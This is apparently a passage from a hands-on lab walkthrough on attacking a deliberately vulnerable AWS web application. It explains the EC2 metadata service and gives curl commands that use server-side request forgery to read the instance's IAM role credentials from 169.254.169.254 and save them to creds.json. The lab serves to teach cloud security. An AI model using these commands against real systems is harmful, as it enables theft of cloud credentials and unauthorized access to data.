  âœ… VPN

  âœ… TOR

  Let's try sending a request - here is what we can do:

  ```bash
    export IP=XXXXX
    curl $IP
  ```

### Step 2:

EC2 instances connect to metadata services to get information about themselves such as:

- what region am I located in?
- what role is attaced to this instance?

#### How AWS Works:

An EC2 has a role based policy it can use to access an s3 bucket. However, it hasn't been authenticated to use the role yet!

![EC2 to s3](./images/Picture%204.png)

It asks the EC2 metadata service to get the credentials of the role in order to access it.

Then we can get access to the bucket:

What are some ways we can take advantage of this to access the bucket ourselves?

  âœ… Server Side Request Forgery

  Let's try sending a request - here is what we can do:

Get the metadata:

  ```bash
    curl "http://$IP/?url=http://169.254.169.254/latest/meta-data/"

  ```

Peek into the IAM folder:

```bash
curl "http://$IP/?url=http://169.254.169.254/latest/meta-data/iam/"
```

ooooh.... security credentials:

```bash
curl "http://$IP/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

```bash
curl "http://$IP/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/VulnV1-webServerRole-EuxRuT802MC4" >> creds.json
```
